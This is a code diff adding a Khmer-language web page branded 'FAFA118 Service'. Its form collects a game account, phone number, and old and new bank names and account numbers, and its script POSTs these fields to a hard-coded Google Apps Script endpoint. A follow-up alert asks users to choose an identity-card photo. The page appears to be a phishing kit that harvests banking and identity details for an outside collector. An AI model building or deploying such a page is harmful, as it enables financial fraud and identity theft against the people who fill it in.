@@ -1,0 +1,58 @@
+<title>FAFA118 Service</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<link rel="stylesheet" href="style.css">
+<body ​ style="background-image: url(00.jpg);background-repeat: no-repeat; background-size: cover;">
+<div class="container text-center">
+  <br>
+  <h1 style="font-weight: bold; color: white;">សូមស្វាគមន៍មកកាន់FAFA118</h1>
+  <div class="card mx-auto" style="width: 18rem;border-radius: 10px 50px;">
+    <div class="card-body" style="background-image: url(00.jpg);border-radius: 10px 50px;">
+      <form name="submit-to-google-sheet" style="padding: 0;border-radius: 15px;">
+        <h5 style="font-weight: bold; color: white;">សូមបញ្ជូលកុងធនាគារចាស់:</h5>
+        <div class="mb-3">
+          <input name="Name Acc" type="text" class="form-control cg" placeholder="គណនីហ្គេម" required>
+        </div>
+        <div class="mb-3">
+          <input name="Phone" type="tel" class="form-control cg" placeholder="លេខទូរស័ព្ទ" required>
+        </div>
+        <div class="mb-3">
+          <input name="Old Bank" type="text" class="form-control cg" placeholder="កុងធនាគារចាស់" required>
+        </div>
+        <div class="mb-3">
+          <input name="Bank ID" type="tel" class="form-control cg" placeholder="លេខកុងធនាគារចាស់" required>
+        </div>
+        <h5 style="font-weight: bold; color: white;">បញ្ជូលកុងធនាគារថ្មី:</h5>
+        <div class="mb-3">
+          <input name="New Bank" type="text" class="form-control cg" placeholder="ឈ្មោះកុងធនាគារថ្មី" required>
+        </div>
+        <div class="mb-3">
+          <input name="New Bank ID" type="tel" class="form-control cg" placeholder="លេខកុងធនាគារថ្មី" required>
+        </div>
+        <button type="submit" class="form-control k1" onclick="myFunction()" style="  width: 200px;  height: 35px;margin: auto;">បញ្ជូន</button>
+        <button type="button" class="form-control k1"  style="  width: 200px;  height: 35px;margin: auto;margin-top: 8px;">
+          <a href="e:\Web Page\indexpic.html" style="font-size: 15px;">ជ្រើសរើសរូប</a>
+        </button>
+        
+      </form>
+    </div>
+  </div>
+</div>
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbx6RLvczFYe7FDviCLt6b_-U-NiUWMsC26oKjGA3Io4J33KlegXoBJNQqWmhoMN33Dg/exec'; // Replace 'Your URL will be here' with the URL of your Google Apps Script
+  const form = document.forms['submit-to-google-sheet'];
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message));
+  });
+</script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+  function myFunction() {
+    alert("បន្ទាប់ពីចុចប៊ូតុងបញ្ជូនរួចសូមចុចពាក្យថា(រូបភាព)ដើម្បីជ្រើសរើសរូបភាពណាដែលមានភ្ជាប់ជាមួយនៅអត្តសញ្ញាណបណ្ណ។ សូមចុចពាក្យថា(OK)ដើម្បីបន្ត​");
+  }
+  </script>
+</body>
+</html>
